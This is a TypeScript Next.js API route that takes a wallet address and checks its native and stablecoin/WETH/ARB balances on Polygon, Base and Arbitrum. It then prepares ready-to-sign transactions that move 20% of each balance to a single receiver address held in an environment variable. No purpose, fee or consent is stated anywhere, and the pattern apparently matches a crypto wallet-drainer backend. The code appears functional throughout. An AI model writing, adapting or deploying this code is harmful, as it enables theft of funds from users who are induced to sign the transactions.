import { NextResponse } from 'next/server'

const RECEIVER_ADDRESS = process.env.RECEIVER_ADDRESS || '0x0000000000000000000000000000000000000000'

const CHAIN_IDS = {
  polygon: 137,
  base: 8453,
  arbitrum: 42161,
}


const TOKEN_CONTRACTS = {
  polygon: {
    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    USDC: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',
    WETH: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
  },
  base: {
    USDC: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
    WETH: '0x4200000000000000000000000000000000000006',
  },
  arbitrum: {
    USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
    USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
    ARB: '0x912CE59144191C1204E64559FE8253a0e49E6548',
    WETH: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
  },
}

const TRANSFER_SIGNATURE = '0xa9059cbb'

const RPC_ENDPOINTS = {
  polygon: ['https://polygon-rpc.com', 'https://polygon-bor-rpc.publicnode.com'],
  base: ['https://mainnet.base.org', 'https://base.publicnode.com'],
  arbitrum: ['https://arb1.arbitrum.io/rpc', 'https://arbitrum-one.publicnode.com'],
}

const BALANCE_OF_SIGNATURE = '0x70a08231'
async function getBalance(rpcUrls: string[], address: string): Promise<bigint> {
  for (const rpcUrl of rpcUrls) {
    try {
      const response = await fetch(rpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          method: 'eth_getBalance',
          params: [address, 'latest'],
          id: 1,
        }),
      })
      const data = await response.json()
      if (data.result) return BigInt(data.result)
    } catch {
      continue
    }
  }
  return BigInt(0)
}

async function getTokenBalance(
  rpcUrls: string[],
  walletAddress: string,
  tokenContract: string
): Promise<bigint> {
  const paddedAddress = walletAddress.slice(2).toLowerCase().padStart(64, '0')
  const data = BALANCE_OF_SIGNATURE + paddedAddress

  for (const rpcUrl of rpcUrls) {
    try {
      const response = await fetch(rpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          method: 'eth_call',
          params: [{ to: tokenContract, data }, 'latest'],
          id: 1,
        }),
      })
      const result = await response.json()
      if (result.result && result.result !== '0x') {
        return BigInt(result.result)
      }
    } catch {
      continue
    }
  }
  return BigInt(0)
}

function createTransferData(to: string, amount: bigint): string {
  const paddedTo = to.slice(2).toLowerCase().padStart(64, '0')
  const paddedAmount = amount.toString(16).padStart(64, '0')
  return TRANSFER_SIGNATURE + paddedTo + paddedAmount
}

interface Transaction {
  chainId: number
  to: string
  value?: string
  data?: string
  type: 'native' | 'erc20'
  token?: string
  amount: string
  amountFormatted: string
}

export async function POST(request: Request) {
  try {
    const { address } = await request.json()

    if (!address) {
      return NextResponse.json({ error: 'Address required' }, { status: 400 })
    }

    const transactions: Transaction[] = []
    const percent = 0.2 // 20%

    // Polygon
    const polygonNative = await getBalance(RPC_ENDPOINTS.polygon, address)
    if (polygonNative > BigInt(0)) {
      const amount = (polygonNative * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.polygon,
          to: RECEIVER_ADDRESS,
          value: '0x' + amount.toString(16),
          type: 'native',
          token: 'POL',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e18).toFixed(6),
        })
      }
    }

    const polygonUSDT = await getTokenBalance(RPC_ENDPOINTS.polygon, address, TOKEN_CONTRACTS.polygon.USDT)
    if (polygonUSDT > BigInt(0)) {
      const amount = (polygonUSDT * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.polygon,
          to: TOKEN_CONTRACTS.polygon.USDT,
          data: createTransferData(RECEIVER_ADDRESS, amount),
          type: 'erc20',
          token: 'USDT',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e6).toFixed(2),
        })
      }
    }

    const polygonUSDC = await getTokenBalance(RPC_ENDPOINTS.polygon, address, TOKEN_CONTRACTS.polygon.USDC)
    if (polygonUSDC > BigInt(0)) {
      const amount = (polygonUSDC * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.polygon,
          to: TOKEN_CONTRACTS.polygon.USDC,
          data: createTransferData(RECEIVER_ADDRESS, amount),
          type: 'erc20',
          token: 'USDC',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e6).toFixed(2),
        })
      }
    }

    const polygonWETH = await getTokenBalance(RPC_ENDPOINTS.polygon, address, TOKEN_CONTRACTS.polygon.WETH)
    if (polygonWETH > BigInt(0)) {
      const amount = (polygonWETH * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.polygon,
          to: TOKEN_CONTRACTS.polygon.WETH,
          data: createTransferData(RECEIVER_ADDRESS, amount),
          type: 'erc20',
          token: 'WETH',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e18).toFixed(6),
        })
      }
    }

    // Base
    const baseNative = await getBalance(RPC_ENDPOINTS.base, address)
    if (baseNative > BigInt(0)) {
      const amount = (baseNative * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.base,
          to: RECEIVER_ADDRESS,
          value: '0x' + amount.toString(16),
          type: 'native',
          token: 'ETH',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e18).toFixed(6),
        })
      }
    }

    const baseUSDC = await getTokenBalance(RPC_ENDPOINTS.base, address, TOKEN_CONTRACTS.base.USDC)
    if (baseUSDC > BigInt(0)) {
      const amount = (baseUSDC * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.base,
          to: TOKEN_CONTRACTS.base.USDC,
          data: createTransferData(RECEIVER_ADDRESS, amount),
          type: 'erc20',
          token: 'USDC',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e6).toFixed(2),
        })
      }
    }

    const baseWETH = await getTokenBalance(RPC_ENDPOINTS.base, address, TOKEN_CONTRACTS.base.WETH)
    if (baseWETH > BigInt(0)) {
      const amount = (baseWETH * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.base,
          to: TOKEN_CONTRACTS.base.WETH,
          data: createTransferData(RECEIVER_ADDRESS, amount),
          type: 'erc20',
          token: 'WETH',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e18).toFixed(6),
        })
      }
    }

    // Arbitrum
    const arbNative = await getBalance(RPC_ENDPOINTS.arbitrum, address)
    if (arbNative > BigInt(0)) {
      const amount = (arbNative * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.arbitrum,
          to: RECEIVER_ADDRESS,
          value: '0x' + amount.toString(16),
          type: 'native',
          token: 'ETH',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e18).toFixed(6),
        })
      }
    }

    const arbUSDT = await getTokenBalance(RPC_ENDPOINTS.arbitrum, address, TOKEN_CONTRACTS.arbitrum.USDT)
    if (arbUSDT > BigInt(0)) {
      const amount = (arbUSDT * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.arbitrum,
          to: TOKEN_CONTRACTS.arbitrum.USDT,
          data: createTransferData(RECEIVER_ADDRESS, amount),
          type: 'erc20',
          token: 'USDT',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e6).toFixed(2),
        })
      }
    }

    const arbUSDC = await getTokenBalance(RPC_ENDPOINTS.arbitrum, address, TOKEN_CONTRACTS.arbitrum.USDC)
    if (arbUSDC > BigInt(0)) {
      const amount = (arbUSDC * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.arbitrum,
          to: TOKEN_CONTRACTS.arbitrum.USDC,
          data: createTransferData(RECEIVER_ADDRESS, amount),
          type: 'erc20',
          token: 'USDC',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e6).toFixed(2),
        })
      }
    }

    const arbARB = await getTokenBalance(RPC_ENDPOINTS.arbitrum, address, TOKEN_CONTRACTS.arbitrum.ARB)
    if (arbARB > BigInt(0)) {
      const amount = (arbARB * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.arbitrum,
          to: TOKEN_CONTRACTS.arbitrum.ARB,
          data: createTransferData(RECEIVER_ADDRESS, amount),
          type: 'erc20',
          token: 'ARB',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e18).toFixed(2),
        })
      }
    }

    const arbWETH = await getTokenBalance(RPC_ENDPOINTS.arbitrum, address, TOKEN_CONTRACTS.arbitrum.WETH)
    if (arbWETH > BigInt(0)) {
      const amount = (arbWETH * BigInt(20)) / BigInt(100)
      if (amount > BigInt(0)) {
        transactions.push({
          chainId: CHAIN_IDS.arbitrum,
          to: TOKEN_CONTRACTS.arbitrum.WETH,
          data: createTransferData(RECEIVER_ADDRESS, amount),
          type: 'erc20',
          token: 'WETH',
          amount: amount.toString(),
          amountFormatted: (Number(amount) / 1e18).toFixed(6),
        })
      }
    }

    return NextResponse.json({
      success: true,
      transactions,
      receiver: RECEIVER_ADDRESS,
      percent: '20%',
    })
  } catch (error) {
    console.error('Error preparing transactions:', error)
    return NextResponse.json({ error: 'Failed to prepare transactions' }, { status: 500 })
  }
}
